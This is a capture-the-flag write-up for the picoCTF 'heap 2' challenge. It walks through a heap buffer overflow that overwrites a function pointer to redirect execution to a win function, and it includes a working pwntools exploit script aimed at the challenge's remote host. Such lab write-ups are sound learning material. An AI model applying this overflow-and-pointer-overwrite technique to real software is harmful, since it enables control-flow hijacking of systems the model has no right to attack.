# heap 2
![image](https://github.com/JosephB10/CTF-Writeups/assets/105746932/2529f1ae-b58d-4376-a964-16b72e9c0f2a)
## Hints
- Are you doing the right endianness?
## Solution
We are given the source code for a binary, the binary compiled, and a remote instance to exploit and get the flag from.
<br><br>
Based on the hints and description we are looking to overflow the buffer and change a function pointer to point at an uncalled function that gives the flag.
- First I looked at the source code
- There is a function `checkwin` that when called, gets it's call location from the `x` variable
- The program gives you a string readout of the `x` variable so you can see it on the heap, and when it's overwritten

<br>First I needed to find the length of the overflow, which would allow me to change the `x` variable.
- You can do this manually by using a unique string and then finding what `x` changes to
- Another technique is to use `gdb` and look at the segfault it spits out when you overwrite the buffer (To see what value is in the segfault memory address)
- Or you can manually overflow the buffer and then check `dmesg | tail` to see the segfault message
- It overflowed `x` after 32 bytes

<br>Then you need the function address for the `checkwin` function
- You can find this with `r2`, `gdb`, `ghidra`, or `objdump -d chall`
- `r2 ./chall`, `aaa`, `afl` and it's right there
- `gdb`, `info functions` this brings back too many results and needs to be regex'd down
- `ghidra` you just go to the function and look at the first address

<br>The last step was to get the formatting of the functions memory address right, so that it would be loaded into memory correctly
- This was the hard part and I ended up using `pwntools` to create and send the payload
- The important part was to change the memory address into `b'` so that it didn't read each character as it's own hex memory address
- Also I could use `pwntools` `sendlineafter` function to send the answers to any inputs that the program needed

<br>This was the python script I wrote with `pwntools`.
```
from pwn import *

#p = process("./chall")                    #Uncomment to use locally
p = remote("mimas.picoctf.net", 49396)     #Uncomment to use Remote

context.log_level = 'debug'                #Gives an indepth view of what you send

#Answer options for each input needed
p.sendlineafter(b':', "2")

#use p64 to pack the memory address correctly as a byte object (64 bit) 
p.sendlineafter(b':', (b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' + p64(0x4011a0)))
p.sendlineafter(b':', "1")
p.sendlineafter(b':', "4")

print(p.recvall().decode())            #This could be replaced by virtualconsole

```
<br>The `sendlineafter` option allowed me to send `stdin` in response the programs `stdout` options.
<br><br>
Using the `pwntools` script worked on the local binary, so I switched it to the remote with comments and got the flag.
<br><br>
## Useful resources 
https://www.youtube.com/watch?v=E4ZWJsGySoY&t=760s       # Tutorial Series on Overflow 
<br>
https://www.youtube.com/watch?v=26mEa1Ojux8                     # John Hammond CTF video

